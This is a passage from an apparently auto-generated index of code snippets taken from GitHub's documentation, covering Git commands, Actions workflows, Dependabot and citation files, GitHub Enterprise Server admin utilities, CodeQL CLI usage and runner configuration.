https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: About your personal dashboard\nversions:\n  fpt: '*'\n  ghes: '>=2.20'\n```\n\n----------------------------------------\n\nTITLE: Execute Git Blame on a File\nDESCRIPTION: This command executes the `git blame` command on a specified file, `README.md`. It requires Git to be installed and configured. The command outputs a detailed history of the file, showing the author and commit that last modified each line.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit blame README.md\n```\n\n----------------------------------------\n\nTITLE: Running a specific Ant target\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to execute a specific target within an Ant build file. It specifies the Java version and distribution, and then runs the 'jar' target defined in 'build-ci.xml'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - name: Run the Ant jar target\n    run: ant -noinput -buildfile build-ci.xml jar\n```\n\n----------------------------------------\n\nTITLE: Example CITATION.cff file\nDESCRIPTION: This is an example of a CITATION.cff file, which is a plain text file containing human- and machine-readable citation information. It includes fields like cff-version, message, authors, title, version, doi, date-released, and url. This file specifies how the software should be cited.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\ncff-version: 1.2.0\nmessage: \"If you use this software, please cite it as below.\"\nauthors:\n- family-names: \"Lisa\"\n  given-names: \"Mona\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\n- family-names: \"Bot\"\n  given-names: \"Hew\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\ntitle: \"My Research Software\"\nversion: 2.0.4\ndoi: 10.5281/zenodo.1234\ndate-released: 2017-12-18\nurl: \"https://github.com/github-linguist/linguist\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Git config in dotfiles (shell)\nDESCRIPTION: This shell snippet demonstrates how to conditionally set a Git configuration value within a dotfiles repository based on whether the code is running within a GitHub Codespace, utilizing the `$CODESPACES` environment variable to only set the value when not in a codespace. This resolves conflicts between dotfiles and codespace default configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-gpg-verification-for-github-codespaces.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nif [ -z \"$CODESPACES\" ]; then\n  git config --global gpg.program gpg2\nfi\n```\n\n----------------------------------------\n\nTITLE: Feedback Format: Hashed Token JSON\nDESCRIPTION: This JSON snippet illustrates the format for providing feedback using the SHA-256 hashed token. It includes the hashed token, its type, and a label indicating whether it's a true or false positive. The \"token_hash\" field should contain the SHA-256 hash of the secret. The \"token_type\" field identifies the secret type. The \"label\" field indicates if it is \"false_positive\".\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"token_hash\": \"The SHA-256 hashed form of the raw token\",\n    \"token_type\": \"ACompany_API_token\",\n    \"label\": \"false_positive\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring DNS Hosts File Example\nDESCRIPTION: This example shows how to modify the local workstation's `hosts` file for testing geo-replication setups. By uncommenting a specific line, you can resolve requests for `HOSTNAME` to a particular replica's IP address. This is for testing purposes only and not for production environments.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_7\n\nLANGUAGE: Text\nCODE:\n```\n# <primary IP>      HOSTNAME\n# <replica1 IP>     HOSTNAME\n<replica2 IP>     HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Specifying Environment Name and URL (YAML)\nDESCRIPTION: This snippet expands on the previous example by demonstrating how to specify both the name and a URL for the environment. The `environment` key now contains a nested object with `name` and `url` properties. The URL is displayed on the deployments page and in the workflow run visualization graph.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/environment-example.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: Deployment\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: \n      name: production\n      url: https://github.com\n    steps:\n      - name: deploy\n        # ...deployment-specific steps\n```\n\n----------------------------------------\n\nTITLE: Running CodeQL Tests\nDESCRIPTION: Executes CodeQL unit tests. It can accept individual `.ql` or `.qlref` test files, or directories containing tests. The command searches specified directories recursively for tests.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/test-run.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql test run [--threads=<num>] [--ram=<MB>] <options>... -- <test|dir>...\n```\n\n----------------------------------------\n\nTITLE: Cloning a Git Repository with `git clone`\nDESCRIPTION: This shell command clones a Git repository from a remote URL to a local directory. It uses the `git clone` command followed by the repository URL. The output shows the cloning process, including counting, compressing, and unpacking objects.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/command_line/local-clone-created.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git clone https://{% data variables.product.product_url %}/YOUR-USERNAME/YOUR-REPOSITORY\n> Cloning into `Spoon-Knife`...\n> remote: Counting objects: 10, done.\n> remote: Compressing objects: 100% (8/8), done.\n> remove: Total 10 (delta 1), reused 10 (delta 1)\n> Unpacking objects: 100% (10/10), done.\n```\n\n----------------------------------------\n\nTITLE: Adding RubyGems Registry as a Source\nDESCRIPTION: This command adds the GitHub Packages registry as a gem source. `USERNAME` should be replaced with the GitHub username, `TOKEN` with the PAT, and `NAMESPACE` with the owner of the repository. Conditional logic handles the registry URL based on the GitHub version (cloud vs. enterprise).\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngem sources --add https://USERNAME:TOKEN@{% ifversion fpt or ghec %}rubygems.pkg.github.com{% else %}REGISTRY_URL{% endif %}/NAMESPACE/\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering for GitHub Team (FPT)\nDESCRIPTION: This snippet conditionally renders text for organizations on {% data variables.product.prodname_team %} if {% data variables.product.prodname_GH_code_security %} is enabled. The {% ifversion fpt %} tag checks if the current version is Free, Pro, and Team.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/security-campaigns.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\nOrganizations on {% data variables.product.prodname_team %} with [{% data variables.product.prodname_GH_code_security %}](/get-started/learning-about-github/about-github-advanced-security) enabled{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Running a Node.js application in Codespaces\nDESCRIPTION: This snippet demonstrates how to start a Node.js application within a GitHub Codespaces environment using the `npm start` command. It assumes that the project has a `package.json` file with a defined `start` script. The command initiates the application, making it accessible via a forwarded port.\nSOURCE: https://github.com/github/docs/blob/main/content/video-transcripts/transcript-codespaces-your-instant-dev-box-in-the-cloud.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Upgrading with ghe-upgrade command\nDESCRIPTION: This code snippet demonstrates how to execute the `ghe-upgrade` command using the administrative shell to install a hotpatch. It requires the hotpatch package file name. The script output includes verification of the upgrade package signature.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/performing-an-upgrade/upgrading-with-a-hotpatch.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nadmin@HOSTNAME:~$ ghe-upgrade GITHUB-UPGRADE.hpkg\n*** verifying upgrade package signature...\n```\n\n----------------------------------------\n\nTITLE: Revoking NES's ability to take a node offline using nes set-node-adminaction\nDESCRIPTION: This snippet shows how to revoke the Node Eligibility Service's (NES) ability to automatically take a node offline. It sets the `adminaction` state to `none` for a specific node using the `nes set-node-adminaction` command. Replace HOSTNAME with the actual hostname.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-adminaction none HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Markdown comment to separate auto-generated content\nDESCRIPTION: This markdown comment serves as a separator in the autogenerated documentation files. Content writers can add introductory paragraphs above this comment, which will be preserved during subsequent pipeline runs. The pipeline will overwrite any content below this comment.\nSOURCE: https://github.com/github/docs/blob/main/src/rest/README.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n<!-- Content after this section is automatically generated -->\n```\n\n----------------------------------------\n\nTITLE: Checking Git status\nDESCRIPTION: This shell command shows the status of the git repository. The output lists untracked files and other changes in the repository. It is used to check which files have been modified, staged, or are untracked.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/quickstart-for-repositories.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git status\n\nUntracked files:\n  (use \"git add <file>...\" to include in what will be committed)\n  README.md\n\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\n\n----------------------------------------\n\nTITLE: Setting Extractor Options from YAML File\nDESCRIPTION: This shows the structure of a YAML file used to set extractor options.  The file structure is equivalent to the JSON example, using YAML syntax for nested maps and lists.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/extractor-options.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nextractor:\n    java:\n        option1: \"abc\"\n        group1:\n            option2: [ 102 ]\n```\n\n----------------------------------------\n\nTITLE: Updating Consul Datacenter - Text\nDESCRIPTION: This configuration snippet shows how to update the `consul-datacenter` to match the renamed primary datacenter. This ensures that Consul, which is used for service discovery and configuration, is aware of the correct datacenter association for each node. Replace 'primary' with the actual name of the primary datacenter.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/configuring-high-availability-replication-for-a-cluster.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nconsul-datacenter = primary\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Logging in logging_config.py (Python)\nDESCRIPTION: This code defines a function `setup_logging` to configure basic logging using the `logging` module. It sets the logging level to INFO and defines a format string for log messages, including timestamp, logger name, log level, and message.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/handling-cross-cutting-concerns.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport logging\n\ndef setup_logging():\n    logging.basicConfig(level=logging.INFO,\n                  format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n```\n\n----------------------------------------\n\nTITLE: Configuring Update Groups with Exclusion Patterns in Dependabot\nDESCRIPTION: This YAML configuration defines a Dependabot group called `support-dependencies` for Bundler, using patterns and exclude-patterns to include or exclude specific dependencies based on their names. It targets version updates and specifies weekly updates for the dependencies.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/dependabot-version-updates-groups-yaml-example.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  # Keep bundler dependencies up to date\n  - package-ecosystem: \"bundler\"{% ifversion dependabot-updates-multidirectory-support %}\n    directories:\n      - \"/frontend\"\n      - \"/backend\"\n      - \"/admin\"{% else %}\n    directory: \"/\"{% endif %}\n    schedule:\n      interval: \"weekly\"\n    # Create a group of dependencies to be updated together in one pull request\n    groups:\n      # Specify a name for the group, which will be used in pull request titles\n      # and branch names\n      support-dependencies:\n        # Define patterns to include dependencies in the group (based on\n        # dependency name){% ifversion dependabot-grouped-security-updates-config %}\n        applies-to: version-updates # Applies the group rule to version updates{%- endif %}\n        patterns:\n          - \"rubocop\" # A single dependency name\n          - \"rspec*\"  # A wildcard string that matches multiple dependency names\n          - \"*\"       # A wildcard that matches all dependencies in the package\n                      # ecosystem. Note: using \"*\" may open a large pull request\n        # Define patterns to exclude dependencies from the group (based on\n        # dependency name)\n        exclude-patterns:\n          - \"gc_ruboconfig\"\n          - \"gocardless-*\"\n```\n\n----------------------------------------\n\nTITLE: Importing GHES License from File\nDESCRIPTION: This command imports a GHES license from a file specified by the `GHE_LICENSE_FILE` environment variable.  It synchronizes the license after import.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_87\n\nLANGUAGE: shell\nCODE:\n```\nGHE_LICENSE_FILE=/path/license ghe-license import\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: Context Value with Colon\nDESCRIPTION: This JSON template customizes the `sub` claim to include `environment` and `repository_owner`, demonstrating how to handle context values containing colons (:) which are replaced with `%3A`. This is important for environments with colons in their names.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"environment\",\n       \"repository_owner\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Certificate Verification Failure Message\nDESCRIPTION: This snippet shows an example error message indicating a certificate verification failure. The message suggests missing or misconfigured certificates, which can prevent services from communicating with each other. This message is found in the web log output.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n certificate verify failed (unable to get issuer certificate)\n```\n\n----------------------------------------\n\nTITLE: Looping through Deprecated Releases on Developer Site\nDESCRIPTION: This snippet iterates through releases whose developer documentation is hosted on a separate site. It generates a table row with release date, deprecation date, and a link to the developer documentation.  Uses Liquid template language.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/all-releases.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- for version in enterpriseServerReleases.deprecatedReleasesOnDeveloperSite %}\n| {{version}} | {{enterpriseServerReleases.dates[version].releaseDate}} | {{enterpriseServerReleases.dates[version].deprecationDate}} | [{{version}} developer documentation](https://developer.github.com/enterprise/{{version}}) |\n{%- endfor %}\n```\n\n----------------------------------------\n\nTITLE: Example curl Response\nDESCRIPTION: This is an example of a response received from the `curl` command when retrieving a list of GitHub issues. It showcases the HTTP status code and various headers providing information about the request.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_15\n\nLANGUAGE: shell\nCODE:\n```\nHTTP/2 200\nserver: GitHub.com\ndate: Thu, 04 Aug 2022 20:07:51 GMT\ncontent-type: application/json; charset=utf-8\ncache-control: public, max-age=60, s-maxage=60\nvary: Accept, Accept-Encoding, Accept, X-Requested-With\netag: W/\"7fceb7e8c958d3ec4d02524b042578dcc7b282192e6c939070f4a70390962e18\"\nx-github-media-type: github.v3; format=json\nlink: <https://api.github.com/repositories/1300192/issues?per_page=2&sort=updated&direction=asc&page=2>; rel=\"next\", <https://api.github.com/repositories/1300192/issues?per_page=2&sort=updated&direction=asc&page=7409>; rel=\"last\"\naccess-control-expose-headers: ETag, Link, Location, Retry-After, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, X-GitHub-SSO, X-GitHub-Request-Id, Deprecation, Sunset\naccess-control-allow-origin: *\nstrict-transport-security: max-age=31536000; includeSubdomains; preload\nx-frame-options: deny\nx-content-type-options: nosniff\nx-xss-protection: 0\nreferrer-policy: origin-when-cross-origin, strict-origin-when-cross-origin\ncontent-security-policy: default-src 'none'\nx-ratelimit-limit: 15000\nx-ratelimit-remaining: 14996\nx-ratelimit-reset: 1659645535\nx-ratelimit-resource: core\nx-ratelimit-used: 4\naccept-ranges: bytes\ncontent-length: 4936\nx-github-request-id: 14E0:4BC6:F1B8BA:208E317:62EC2715\n```\n\n----------------------------------------\n\nTITLE: Regex pattern to limit commit message first line length\nDESCRIPTION: This regular expression enforces a maximum length of 50 characters for the first line of commit messages, as recommended by the Pro Git book. It ensures that the first line adheres to the suggested commit message guidelines. It must be used with the \"Must match a given regex pattern\" requirement.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/rulesets-commit-regex.md#_snippet_2\n\nLANGUAGE: regex\nCODE:\n```\n\\A.{1,50}$\n```\n\n----------------------------------------\n\nTITLE: Example About Me Section\nDESCRIPTION: A markdown example to introduce yourself. Includes heading and example text\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\n## About me\n\nHi, I'm Mona. You might recognize me as {% data variables.product.prodname_dotcom %}'s mascot.\n```\n\n----------------------------------------\n\nTITLE: Describing reviewed Event Properties\nDESCRIPTION: Describes the properties associated with the `reviewed` event in the GitHub API timeline events. It includes details about the event's ID, user, body, commit ID, submission timestamp, state, HTML URL, pull request URL, author association, links, and event type.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/issue-event-types.md#_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\nName | Type | Description\n-----|------|--------------\n`id` | `integer` | The unique identifier of the event.\n`node_id` | `string` | The [Global Node ID](/graphql/guides/using-global-node-ids) of the event.\n`user` | `object` | The person who commented on the issue.\n`body` | `string` | The review summary text.\n`commit_id` | `string` | The SHA of the latest commit in the pull request at the time of the review.\n`submitted_at` | `string` | The timestamp indicating when the review was submitted.\n`state` | `string` | The state of the submitted review. Can be one of: `commented`, `changes_requested`, `approved` or `dismissed`.\n`html_url` | `string` | The HTML URL of the review.\n`pull_request_url` | `string` | The REST API URL to retrieve the pull request.\n`author_association` | `string` | The permissions the user has in the issue's repository. For example, the value would be `\"OWNER\"` if the owner of repository created a comment.\n`_links` | `object` | The `html_url` and `pull_request_url`.\n`event` | `string` | The event value is `\"reviewed\"`.\n```\n\n----------------------------------------\n\nTITLE: Define domains for retrieving OIDC tokens\nDESCRIPTION: This domain is required for retrieving OpenID Connect (OIDC) tokens. Enables secure authentication and authorization within workflows.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n*.actions.githubusercontent.com\n```\n\n----------------------------------------\n\nTITLE: Preventing Link transformations to dotcom-only\nDESCRIPTION: Demonstrates how to prevent automatic transformation of links to dotcom-only articles in Enterprise content by including the preferred version in the path. This ensures that the link points to the correct version of the article.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\n[GitHub's Terms of Service](/free-pro-team@latest/github/site-policy/github-terms-of-service)\n```\n\n----------------------------------------\n\nTITLE: Starting Replication\nDESCRIPTION: This command initiates the replication process on a replica node. It assumes that the necessary configuration and network setup have already been completed. No specific input parameters are required; it directly starts the replication process.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/start-replication.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Adding link anchors - Markdown\nDESCRIPTION: This code snippet demonstrates how to add a link anchor to a specific section in a Markdown article. This preserves the link even if the section title changes.  It uses an HTML anchor tag with a descriptive comment. The anchor name should be the section name being preserved.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_26\n\nLANGUAGE: Markdown\nCODE:\n```\n<!-- Anchor to maintain the current example link. -->\n<a name=\"SECTION-TITLE-THAT-MIGHT-CHANGE\"></a>\n```\n\n----------------------------------------\n\nTITLE: Workflow Run Trigger with Inclusion and Exclusion (YAML)\nDESCRIPTION: This snippet demonstrates using both inclusion and exclusion patterns within the `branches` filter.  It configures a workflow to trigger when the workflow named `Build` runs on a branch that is named `releases/10` or `releases/beta/mona` but will not `releases/10-alpha`, `releases/beta/3-alpha`, or `main`. It first includes all branches starting with `releases/**` and then excludes any branch that matches `releases/**-alpha`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/section-specifying-branches.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'\n```\n\n----------------------------------------\n\nTITLE: APA Citation Example\nDESCRIPTION: This is an example of an APA citation generated from the CITATION.cff file.  It shows the format in which the software should be cited according to the APA style guide. It includes author names, year, title, version, and DOI.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nLisa, M., & Bot, H. (2017). My Research Software (Version 2.0.4) [Computer software]. https://doi.org/10.5281/zenodo.1234\n```\n\n----------------------------------------\n\nTITLE: Handling Redirect URI Mismatch - JSON\nDESCRIPTION: This JSON snippet shows the error response when the provided `redirect_uri` doesn't match the registered callback URL for the OAuth app.  To fix this, either provide a matching `redirect_uri` or omit the parameter to use the default.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-oauth-app-access-token-request-errors.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"error\": \"redirect_uri_mismatch\",\n  \"error_description\": \"The redirect_uri MUST match the registered callback URL for this application.\",\n  \"error_uri\": \"/apps/managing-oauth-apps/troubleshooting-authorization-request-errors/#redirect-uri-mismatch2\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Fallback Partition (Legacy)\nDESCRIPTION: This command creates a fallback partition on the secondary partition of the newly added disk.  Replace `/dev/xvdg2` with the actual device name.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\nsudo mkfs.ext4 -L fallback /dev/xvdg2\n```\n\n----------------------------------------\n\nTITLE: Reporting Weak SSH Fingerprints with ghe-ssh-weak-fingerprints (Shell)\nDESCRIPTION: The `ghe-ssh-weak-fingerprints` utility returns a report of known weak SSH keys stored on the GitHub Enterprise Server appliance. It can also revoke weak user keys as a bulk action using the `--revoke` flag.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_24\n\nLANGUAGE: shell\nCODE:\n```\n# Print a report of weak user and system SSH keys\n$ ghe-ssh-weak-fingerprints\n```\n\nLANGUAGE: shell\nCODE:\n```\n# Revoke all weak user keys\n$ ghe-ssh-weak-fingerprints --revoke\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow Run URL Example (GHES)\nDESCRIPTION: This snippet demonstrates an example URL format for a GitHub Actions workflow run on GitHub Enterprise Server (GHES). The URL includes the domain of the GHES instance, the organization, the repository, and the specific run ID. This allows GitHub Support to quickly access relevant execution details.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions.md#_snippet_1\n\nLANGUAGE: Text\nCODE:\n```\nhttps://DOMAIN/ORG/REPO/actions/runs/0123456789\n```\n\n----------------------------------------\n\nTITLE: Specifying Self-Hosted Runner OS in YAML\nDESCRIPTION: This snippet demonstrates how to configure the operating system for a self-hosted runner in a code scanning workflow.  `runs-on` specifies `self-hosted` and the OS label.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  analyze:\n    name: Analyze\n    runs-on: [self-hosted, ubuntu-latest]\n```\n\n----------------------------------------\n\nTITLE: Executing Migration Script in PowerShell\nDESCRIPTION: This script demonstrates how to execute a generated migration script in PowerShell. It utilizes the `.\\` prefix to specify the current directory when executing the script. Replace `FILENAME` with the actual name of the script file.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/migrate-multiple-repos.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n.\\FILENAME\n```\n\n----------------------------------------\n\nTITLE: Get Git Commit SHA from Subversion\nDESCRIPTION: This snippet retrieves the Git commit SHA associated with a specific Subversion commit. This allows you to correlate Subversion revisions with their corresponding Git commits, which is useful for debugging and tracking changes. Requires an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n$ svn propget git-commit --revprop -r HEAD https://github.com/USER/REPO\n05fcc584ed53d7b0c92e116cb7e64d198b13c4e3\n```\n\n----------------------------------------\n\nTITLE: Decompile CodeQL query\nDESCRIPTION: Decompiles a CodeQL query (QLO file) using the `codeql query decompile` command. The decompiled output can be directed to standard output or a specified file.  Various options allow for choosing the intermediate representation (`dil`, `ra`, or `bytecode`).\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/query-decompile.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql query decompile [--output=<file>] <options>... -- <file>\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering for GitHub Product Names (Liquid)\nDESCRIPTION: This snippet uses Liquid templating to conditionally render the correct product name (GitHub.com or GitHub Enterprise Server) based on the version being used. It checks for the `fpt` or `ghec` version and displays the appropriate product name accordingly. This ensures accurate documentation for different GitHub platforms.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/dependabot-security-updates.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion fpt or ghec %}\n\n* All repositories on {% data variables.product.prodname_dotcom %}\n\n{% else %}\n\n* All repositories on {% data variables.product.prodname_ghe_server %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Running Full Archiving for GHES Version (Shell)\nDESCRIPTION: This shell command executes the archive-version script to scrape and archive the documentation content for the GHES version being deprecated.  It will overwrite any previous archived versions. A specific output directory can be specified with the --output flag.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/deprecation-steps.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm run archive-version\n```\n\n----------------------------------------\n\nTITLE: Configuring AAAA Records for Apex Domain in Shell\nDESCRIPTION: This code snippet displays the IPv6 addresses used to configure AAAA records for an apex domain, directing it to GitHub Pages. Similar to A records, using all four addresses ensures redundancy and availability for IPv6 connections.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n2606:50c0:8000::153\n2606:50c0:8001::153\n2606:50c0:8002::153\n2606:50c0:8003::153\n```\n\n----------------------------------------\n\nTITLE: Running bugged Factorial file on Windows\nDESCRIPTION: This shell command is used to execute the 'bugged_factorial_finder.py' Python script on a Windows system. It uses the 'py' command, which is the Python launcher for Windows, to run the specified Python file.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\npy bugged_factorial_finder.py\n```\n\n----------------------------------------\n\nTITLE: Add and Commit OpenAPI Changes (Shell)\nDESCRIPTION: Stages and commits the modified OpenAPI files after running the `sync-rest` script. Assumes the working directory is the root of the `github/docs-internal` repository.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-5.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit add .\ngit commit -m \"Add generated OpenAPI files\"\n```\n\n----------------------------------------\n\nTITLE: Adding a hidden comment using HTML\nDESCRIPTION: This snippet shows how to add a hidden comment to your profile README using HTML comment syntax (`<!-- COMMENT -->`). These comments are not displayed in the rendered output.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n<!-- COMMENT -->\n```\n\n----------------------------------------\n\nTITLE: Docker-in-Docker Mode Configuration - YAML\nDESCRIPTION: This YAML snippet represents the default configuration applied to the `template.spec` when Docker-in-Docker (dind) mode is enabled. It includes the definitions for `initContainers`, `containers` (runner and dind), and `volumes`. These configurations cannot be overridden unless `containerMode.type` is unset.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\ntemplate:\n  spec:\n    initContainers:\n      - name: init-dind-externals\n        image: ghcr.io/actions/actions-runner:latest\n        command:\n          [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n        volumeMounts:\n          - name: dind-externals\n            mountPath: /home/runner/tmpDir\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        env:\n          - name: DOCKER_HOST\n            value: unix:///var/run/docker.sock\n        volumeMounts:\n          - name: work\n            mountPath: /home/runner/_work\n          - name: dind-sock\n            mountPath: 